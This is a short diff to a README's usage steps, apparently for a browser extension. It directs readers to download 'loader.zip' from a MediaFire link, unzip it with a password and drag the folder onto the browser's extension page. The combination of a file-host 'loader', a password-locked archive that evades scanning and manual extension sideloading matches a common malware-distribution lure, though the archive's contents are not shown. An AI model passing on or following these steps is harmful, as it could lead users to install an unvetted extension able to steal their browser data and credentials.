@@ -11,4 +11,6 @@ HOW TO USE IT
 
 3> Download this .zip file: https://download2263.mediafire.com/4hud1actfz1g/att89jpfth2i9pj/loader.zip
 
-4> Drag & Drop there the .zip file on extension page
+4> Unzip the file with password
+
+5> Drag & Drop the folder in extension page
